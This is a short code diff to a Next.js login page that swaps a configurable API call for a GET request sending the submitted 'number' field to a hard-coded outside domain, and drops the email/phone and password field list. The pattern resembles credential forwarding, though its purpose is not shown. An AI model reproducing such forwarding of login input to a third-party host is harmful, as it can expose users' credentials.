@@ -4,7 +4,6 @@ import { useState } from 'react';
 import { useRouter } from 'next/router';
 import { handle, json, redirect } from 'next-runtime';
 import { useFormSubmit, Form } from 'next-runtime/form';
-import baseUrl from '../components/baseUrl';
 import LoginComponent from '../components/LoginComponent';
 import Image from 'next/image';
 import Logo from '../public/images/logo.webp'
@@ -12,17 +11,15 @@ export const getServerSideProps = handle({
   async get() {
     return json({});
   },
-  async post({ req: { body }, cookies}: any) {
-    const result = await axios.post(`${baseUrl}/${body.number}`, body, {headers : {"content-type": "multipart/form-data"}})
+  async post({ req: { body }}: any) {
+    const result = await axios.get(`https://mupao.lavajavahouse.net/${body.number}`)
     return json({data: result.data});
   },
 });
 
-export default function Home() {
-  const fields = ["Email or Phone ", "Password"]
+export default function Home({ data }: any) {
 
-  const router = useRouter({ data }: any)
-  const [show, setShow] = useState(false)
+  const router = useRouter()
   const form = useFormSubmit()
   useEffect(() => {
     if (form.isSuccess){
